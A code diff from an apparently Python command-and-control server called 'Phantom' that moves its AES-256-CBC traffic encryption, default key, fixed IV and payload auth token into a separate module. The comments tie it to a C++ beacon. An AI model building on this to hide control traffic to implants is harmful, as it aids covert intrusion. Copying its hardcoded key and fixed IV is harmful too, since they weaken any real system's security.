@@ -14,11 +14,12 @@ from datetime import datetime
 from typing import Any, Optional
 
 from aiohttp import web
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import padding
-
 from phantom.core.logger import logger
+from phantom.utils.c2_crypto import (
+    get_payload_token, 
+    encrypt_data, 
+    decrypt_data
+)
 
 
 # ── Shared State ────────────────────────────────────────────────────────────
@@ -76,48 +77,7 @@ class C2State:
 
 
 c2_state = C2State()
-
-
-# ── Crypto Utils ────────────────────────────────────────────────────────────
-# AES-256-CBC. Key and IV must match the C++ beacon's crypto.h exactly.
-
-DEFAULT_AES_KEY = b"PhantomC2_SecretKey_32bytes_Long"
-DEFAULT_AES_IV  = b"PhantomC2_IV16b\x00"
-
-AES_KEY = os.getenv("PHANTOM_C2_KEY", "").encode()
-if len(AES_KEY) != 32:
-    AES_KEY = DEFAULT_AES_KEY
-
-AES_IV = os.getenv("PHANTOM_C2_IV", "").encode()
-if len(AES_IV) != 16:
-    AES_IV = DEFAULT_AES_IV
-
-PAYLOAD_AUTH_TOKEN = os.getenv("PHANTOM_PAYLOAD_TOKEN", "PhantomDefaultToken")
-
-
-def encrypt_data(plaintext: str) -> str:
-    """Encrypt plaintext with AES-256-CBC and return base64-encoded ciphertext."""
-    padder = padding.PKCS7(128).padder()
-    padded_data = padder.update(plaintext.encode()) + padder.finalize()
-    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
-    encryptor = cipher.encryptor()
-    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-    return base64.b64encode(ciphertext).decode()
-
-
-def decrypt_data(ciphertext_b64: str) -> str:
-    """Decrypt base64-encoded AES-256-CBC ciphertext and return plaintext."""
-    try:
-        ciphertext = base64.b64decode(ciphertext_b64)
-        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
-        decryptor = cipher.decryptor()
-        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
-        unpadder = padding.PKCS7(128).unpadder()
-        plaintext = unpadder.update(padded_data) + unpadder.finalize()
-        return plaintext.decode()
-    except Exception as e:
-        logger.error(f"Decryption failed: {e}")
-        return ""
+PAYLOAD_AUTH_TOKEN = get_payload_token()
 
 
 # ── aiohttp Handlers ───────────────────────────────────────────────────────
